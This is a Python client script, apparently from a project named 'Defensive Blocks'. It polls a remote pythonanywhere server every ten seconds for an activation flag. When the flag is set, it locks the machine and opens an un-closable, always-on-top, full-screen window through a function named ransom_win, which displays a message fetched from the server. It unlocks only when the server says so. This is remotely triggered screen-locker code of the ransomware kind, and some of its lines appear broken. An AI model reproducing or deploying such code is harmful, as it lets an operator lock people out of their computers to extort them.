import requests
from Client2.finals import Finals as final
from apscheduler.schedulers.blocking import BlockingScheduler
from threading import Thread
import threading
from Client2.assisting import *
from Client2.devcon_automations import *
from time import sleep
from tkinter import *
import tkinter as tk


getActivation = "http://defensiveblocks.pythonanywhere.com/clients/" + final.USERNAME + "/"
getMsg = "http://defensiveblocks.pythonanywhere.com/clientsm/" + final.USERNAME + "/"
scheduler = BlockingScheduler()
wa = tk.Tk()
replace(final.thread, 0)


def ransom_win():
    v = tk.StringVar()
    print("hello")
    wa = tk.Tk()
    wa.title('Defensive Blocks')
    wa.overrideredirect(True)
    wa.geometry("{0}x{1}+0+0".format(wa.winfo_screenwidth()+200, wa.winfo_screenheight()+200))
    wa.focus_set()  # <-- move focus to this widget
    wa.protocol("WM_DELETE_WINDOW", exb)
    wa.protocol("WM_MINIMIZE_WINDOW", exb)
    v.set(requests.get(getMsg).text)
    Label(wa, text=v + "\n", font=("Arial Bold", 70), pady=200, fg="RED").pack()
    wa.call('wm', 'attributes', '.', '-topmost', '1')
    while 1:
        v.set(requests.get(getMsg))
        wa.update()
        sleep(2)
        a_field = get(final.active_field)
        if a_field == "0":
            replace(final.thread, 0)
            wa.destroy()
            return


def main():
    global wa
    activation = (requests.get(getActivation)).text  # current activation
    print(activation)
    try:
        is_open = wa.winfo_ismapped()  # if the window is open return 1"""
    except:
        is_open = 0
    if get(final.active_field) != activation:  # compare previous to current
        print("in long if")
        if (str(activation) == "1") and (str(get(final.active_field)) == "0"):
            print("here")
            replace(final.active_field, activation)
            lock()
            open_window = Thread(target=ransom_win)
            open_window.start()
        elif (str(activation) == "0") and (str(get(final.active_field)) == "1"):
            replace(final.active_field, activation)
            unlock()
    elif activation == "1":
        print("in activation == 1")
        print("is open is " + str(is_open))
        if is_open != get(final.active_field) and is_open == 0:
            replace(final.active_field, 1)
            if get(final.thread) == "0":
                lock()
                open_window = Thread(target=ransom_win)
                print("thread number is " + str(threading.get_ident()))
                open_window.start()
    elif activation == "0":
        print("in activation == 0")
        print("is open is " + str(is_open))

        if is_open != get(final.active_field) and is_open == 1:
            replace(final.active_field, 0)
            unlock()
    else:
        print("in else")
        return


scheduler.add_job(main, 'cron', second="0,10,20,30,40,50")  # replace if want to 0,30
scheduler.start()
